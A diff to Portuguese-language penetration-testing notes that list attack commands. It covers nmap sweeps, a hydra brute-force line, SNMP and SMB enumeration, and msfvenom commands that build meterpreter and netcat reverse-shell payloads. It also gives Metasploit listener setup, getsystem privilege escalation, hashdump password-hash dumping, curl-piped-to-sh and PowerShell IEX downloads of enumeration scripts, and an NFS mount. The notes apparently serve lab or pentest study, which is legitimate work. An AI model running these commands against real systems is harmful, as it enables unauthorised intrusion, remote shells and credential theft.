@@ -57,6 +57,7 @@ nmap -sn -PR 10.10.1.0/24
 
 **Ping Sweep**
 Comando: `nmap -sn -PE 10.10.1.0/24`
+
 Comando: `for ip in {2..254}; do (ping -c 1 192.168.200.${ip} | grep "bytes from" &);done`
 
 `nmap -Pn -p88 -sV -O 192.168.2.37`
@@ -137,9 +138,6 @@ Command: `hydra -v -L users.tt -P pass.txt 192.168.200.1 http-post-form "/direto
 
 ### Enumeração
 
-[[Pentest Notes - Enum Services]]
-
-
 **DNS**
 Comando: `host -l <dns> <dns>`
 
@@ -151,9 +149,6 @@ nmap -sU -p 161 192.168.10.103 --scrip=snmp-win32-shares.nse
 nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse
 
 snmp-check 192.168.10.103
-
-**DNS**
-desafio 192.168.10.100
 
 **NFS**
 
@@ -175,11 +170,14 @@ nbtscan -r 192.168.10.0/24
 
 crackmapexec smb ip/24
 
-
 **HTTP/HTTPS**
 wafw00f
+
 curl --head www.smaff.com.br
+
 whatweb www.smaff.com.br
+
+nmap -sV --script=http-enum
 
 ```
 nikto -h 192.168.10.107
@@ -191,14 +189,15 @@ nikto -h www.google.com -o nikto_scan_results -F txt
 ```
 
 
-nmap -sV --script=http-enum
 
 **Criando Payloads com o Msfvenom**
+
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.2 lport=4321 --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" -f exe -o meumalvadofavorito.exe
 
 msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=4244
 
 **Colocando a máquina para escutar**
+
 use exploit/multi/handler
 
 set payload windows/meterpreter/reverse_tcp
@@ -209,12 +208,21 @@ set lport 4321
 
 exploit
 
+**Verificando os privilégios de usuário**
 getuid
+
+**Escalando privilégios**
+getsystem
+
+**Realizando o dump de hashs de senhas**
 hashdump
+
+**Verificando os processos**
 ps
 
 
 **LinPEAS**
+
 https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 Comando: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
 
@@ -224,7 +232,8 @@ Comando: `powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.
 
 ## Exploração
 
-Montando diretórios NFS
+**Montando diretórios NFS**
+
 Comando: `mount -t nfs -o vers=3 192.168.200.124:/var/nfs/general /mnt`
 
 ## Pós Exploração
